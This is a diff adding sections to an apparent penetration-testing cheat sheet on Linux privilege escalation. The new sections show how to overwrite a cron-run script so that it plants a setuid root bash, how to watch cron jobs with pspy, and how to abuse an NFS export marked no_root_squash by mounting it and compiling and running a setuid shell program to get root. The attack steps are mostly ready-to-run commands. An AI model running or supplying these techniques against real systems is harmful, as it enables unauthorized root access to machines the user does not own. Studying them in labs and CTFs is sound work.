@@ -440,6 +440,17 @@ Explanation:
 The first command means that you display progress messages every 1 record.
 And then, when you reach this checkpoint, run this command.
 
+##### Cron File overwrite (script files)
+
+It is simple.
+Check if you can overwrite a file and if you want to use a reverse shell.
+If so, check if you have nc, socat or bash.
+Then you can do like this:
+
+```
+echo "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash" >> /full/path/to/binary.sh
+```
+
 ##### Check for some cronjobs out of crontab
 
 [pspy](https://github.com/DominicBreuker/pspy)
@@ -447,6 +458,8 @@ Just run it!
 ```
 ./pspy64
 ```
+
+Wait some time and the you will see something going on.
 
 #### Password Authentication
 
@@ -483,6 +496,47 @@ Run the command:
 ```
 sudo LD_PRELOAD=/full/path/to/shell.so (something that we can run as sudo!)
 ```
+
+#### NFS Root Squash
+
+Check if there is a vulnerability here:
+```
+cat /etc/export
+```
+
+If you have some folder with no_root_squash, then you can mount that folder
+
+Check if you can mount something
+```
+showmount -e $rhost
+```
+
+Create folder for remote folder
+```
+mkdir mountme
+```
+
+Mount that folder
+```
+mount -o rw,vers=2 $rhost:/remotedir /full/path/to/mountme
+```
+
+Let's create a malicious file:
+```
+echo "int main(){ setgid(0); setuid(0); system('/bin/bash'); return 0;}" > /mountme/x.c
+```
+
+Let's gcc this:
+```
+gcc /mountme/x.c -o /mountme/x
+```
+
+Then's let's use the chmod +s:
+```
+chmod +s x
+```
+
+Then, in your remote machine, run your x file to get root.
 
 #### Setuid Binaries and Capabilities
 
